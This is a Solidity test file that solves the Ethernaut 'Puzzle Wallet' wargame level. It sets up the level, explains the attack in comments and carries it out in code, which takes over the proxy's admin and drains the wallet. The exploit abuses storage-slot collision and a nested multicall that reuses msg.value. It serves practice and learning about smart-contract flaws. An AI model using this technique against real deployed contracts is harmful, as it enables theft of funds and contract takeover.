// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/PuzzleWallet.sol";
import "src/levels/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet private puzzleWallet;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        // Check that the contract is correctly setup
        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // We have to become the admin of Puzzle Proxy, apart from constructor, admin variable can
        // only be set by calling approveNewAdmin() fn, but this fn is restricted to admin only, which means we
        // can not update the admin address from any other account.

        // Puzzle Proxy is a proxy contract, we can become the admin of Puzzle proxy if somehow we can modify slot #1
        // of target contract (because admin variable is stored at slot #1 in Puzzle proxy)

        // We can modify slot #1 of Puzzle Wallet by calling setMaxBalance() fn, but this fn can only be called
        // by the whitelisted address and the puzzle wallet contract should have 0 ether balance, so first
        // we have to whitelist our address and then we have to drain the ether balance of puzzle wallet contract,
        // puzzle wallet contract is initialized with 0.001 ether balance.

        // Funds can be taken out from the contract by calling it's execute fn, but execute fn only allow you
        // to withdraw funds that you have deposited. So, if we deposit 0.001 ether, we can only withdraw 0.001
        // ether as puzzleWallet keeps track of the deposited amount in balances mapping and only allow you to withdraw
        // the amount set against your address in balances mapping.

        // We need to find a way in which the value against our address in balances mapping
        // has a value that we deposited by calling deposit fn + 0.001 ether (contract initial balance).

        // Our multicall fn also prevents us from re-using msg.value in deposit fn, as it only allows us to call
        // deposit fn once using multicall. But, if we can call deposit fn again in our multicall fn by
        // passing in a fn signature that is different than deposit fn then we can drain all the funds

        // To do so, now we will prepare a payload to send to the multicall fn which calls deposit fn twice
        // but re-uses msg.value

        // First element of our _data param would be a direct call to the deposit fn, second fn of our
        // _data param would be a nested call to the multicall fn, param in our nested call would be the selector
        // of the deposit fn again, this will allow us to re-use msg.value.

        // When we call deposit fn directly, it will set the depositCalled to true, but when we make nested call
        // multicall will be called again, and this time depositCalled would be false, allowing us to call
        // deposit again and re-using msg.value

        // After this call, our address will hold 0.002 ether value in balances mapping, we can now call the execute fn and
        // drain all the funds of the contract

        // Now, we can modify slot #1 of PuzzleProxy (which stores the admin address) by modifying setMaxBalance.

        vm.startPrank(player);

        level.proposeNewAdmin(player);

        puzzleWallet.addToWhitelist(player);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, depositSelector);

        puzzleWallet.multicall{value: 0.001 ether}(nestedMulticall);

        puzzleWallet.execute(player, 0.002 ether, "");

        puzzleWallet.setMaxBalance(uint256(player));

        assertEq(level.admin(), player);
        vm.stopPrank();
    }
}
